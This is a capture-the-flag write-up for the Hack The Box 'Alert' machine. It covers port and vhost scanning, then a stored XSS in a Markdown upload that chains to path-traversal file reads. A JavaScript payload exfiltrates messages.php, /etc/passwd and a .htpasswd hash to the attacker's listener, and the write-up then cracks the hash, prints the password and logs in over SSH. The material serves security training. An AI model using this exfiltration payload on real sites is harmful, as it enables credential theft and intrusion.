# Disclaimer: This writeup includes user flag only. 

## HTB Alert Writeup: Exploiting LFI via XSS
The path involves discovering a Cross-Site Scripting (XSS) vulnerability that allows for Local File Inclusion (LFI) to extract sensitive configuration files, ultimately leading to credential theft.

### 1. Enumeration

Network Scanning; We begin by identifying open ports using a two-stage nmap scan.

#### Stage 1: Fast port discovery
```ports=$(nmap -p- --min-rate=1000 -T4 10.129.208.220 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)```

#### Stage 2: Service version and script scanning
```nmap -p$ports -sC -sV 10.129.208.220 -oN nmap```

Results:

Port 22: OpenSSH 8.2p1 (Ubuntu)

Port 80: Apache httpd 2.4.41

#### Web Exploration

Before browsing, add the host to your local /etc/hosts file: 10.129.208.220 alert.htb

Navigating to http://alert.htb, we find a site built with PHP. Key endpoints include:

/donate: Restricted input (numbers only).

<img width="1279" height="628" alt="image" src="https://github.com/user-attachments/assets/13f1636b-1226-4069-b37f-e4b347b2cb33" />

/about & /contact: Static information.

<img width="1279" height="727" alt="image" src="https://github.com/user-attachments/assets/9415b3c0-bcc6-4bb8-b99d-efc3ce37d11d" />

<img width="1279" height="730" alt="image" src="https://github.com/user-attachments/assets/a51a8976-ba19-4b3f-a52b-8faaebb6030e" />

/alert: An upload functionality that specifically accepts .md (Markdown) files.

<img width="1279" height="712" alt="image" src="https://github.com/user-attachments/assets/d89c8628-58cb-4604-a5d0-f9040cb0c3b4" />

#### Subdomain/Vhost Discovery

Searching for hidden subdomains or virtual hosts reveals a restricted area:

```ffuf -u http://10.129.208.220 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.alert.htb" -fc 301```

Found: statistics.alert.htb. Accessing this subdomain prompts for HTTP Basic Authentication, which we currently lack.

<img width="957" height="417" alt="image" src="https://github.com/user-attachments/assets/f5366669-8422-497d-bb3c-7b29198804b5" />

### 2. Vulnerability Analysis: XSS to LFI

Attempts to upload a PHP webshell through the /alert page failed due to strict extension whitelisting. 

<img width="957" height="469" alt="image" src="https://github.com/user-attachments/assets/3516fce4-99ee-490c-ae69-ce1af7a6f91b" />

Data from the request is reflected in the response. I broke out of the ```<p>``` tag

<img width="957" height="510" alt="image" src="https://github.com/user-attachments/assets/495329c2-fd4f-4cd6-9560-f1fcd82c3af8" />

Tried to put the script. 

<img width="979" height="474" alt="image" src="https://github.com/user-attachments/assets/6fb824cb-67a2-40aa-8177-443cd1028cf1" />

Resulted in Stored XSS.

<img width="1005" height="540" alt="image" src="https://github.com/user-attachments/assets/d43f0354-f3fb-46ef-8d3b-80b8d2142435" />

The Attack Flow

Since an "administrator" or automated bot likely reviews these alerts/messages, we can use XSS to force the administrator's browser to fetch internal files and send them back to our machine.

### 3. Exploitation

#### Step 1: Crafting the Payload
We create a JavaScript file (pwned.js) that uses XMLHttpRequest to read local files and exfiltrate the data to our listener.

pwned.js

#### JavaScript

```
var req = new XMLHttpRequest();
req.open('GET', '[http://alert.htb/messages.php](http://alert.htb/messages.php)', false);
req.send();
var req2 = new XMLHttpRequest();
req2.open('GET', '[http://10.10.14.157:5000/?content=](http://10.10.14.5:3000/?content=)' + btoa(req.responseText),
true);
req2.send();
```

<img width="983" height="468" alt="image" src="https://github.com/user-attachments/assets/d0b6a8a7-e35a-4462-a43e-92b23cde8ff2" />

#### Step 2: Infiltration

Start a local Python server: ```python3 -m http.server 5000```

In the /alert section of the website, upload a .md file containing the XSS hook:

```<script src="http://10.10.14.157:5000/pwned.js"></script>```

Once the bot views the message, you will receive a Base64 encoded string in your Python logs.

<img width="1253" height="104" alt="image" src="https://github.com/user-attachments/assets/4ec9ec0c-8394-4513-8b29-3ed49b0b17ca" />

Decoded:

<img width="641" height="484" alt="image" src="https://github.com/user-attachments/assets/0e1c34eb-1960-4eb6-a47c-1d6bf982d05a" />

Changed the script to views /etc/passwd

```
var req = new XMLHttpRequest();
// Target the internal messages page to check for LFI
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../etc/passwd', false);
req.send();

// Exfiltrate the response to our attacker machine
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://10.10.14.157:5000/?content=' + btoa(req.responseText), true);
req2.send();
```

/etc/passwd

<img width="673" height="338" alt="image" src="https://github.com/user-attachments/assets/212529a4-28eb-495c-9e7d-ce62a8a38c2f" />

### Step 3: Extracting Credentials
By leveraging the LFI to read the Apache configuration file, we can find the location of the .htpasswd file used for the statistics.alert.htb subdomain.

Target File: /etc/apache2/sites-available/000-default.conf

<img width="630" height="581" alt="image" src="https://github.com/user-attachments/assets/0c90a461-1468-44fb-bcb8-88db3b4b83dc" />

The config reveals the path: /var/www/statistics.alert.htb/.htpasswd. Updating the pwned.js script to target this path yields the following hash: albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/

<img width="642" height="397" alt="image" src="https://github.com/user-attachments/assets/3ce3e0b8-eed4-46a3-9337-b64fc8c45543" />

### 4. Cracking and Foothold

Hash Cracking
Save the hash to hash.txt and use Hashcat (Mode 1600 for Apache MD5):


```hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt```

<img width="648" height="642" alt="image" src="https://github.com/user-attachments/assets/38c03fbb-af45-4ab1-b038-2ee85fe87858" />

The cracked password is: ```manchesterunited```

#### SSH Access
Using the discovered credentials for the user albert:

```ssh albert@alert.htb```

Once logged in, you can find user.txt in the home directory.
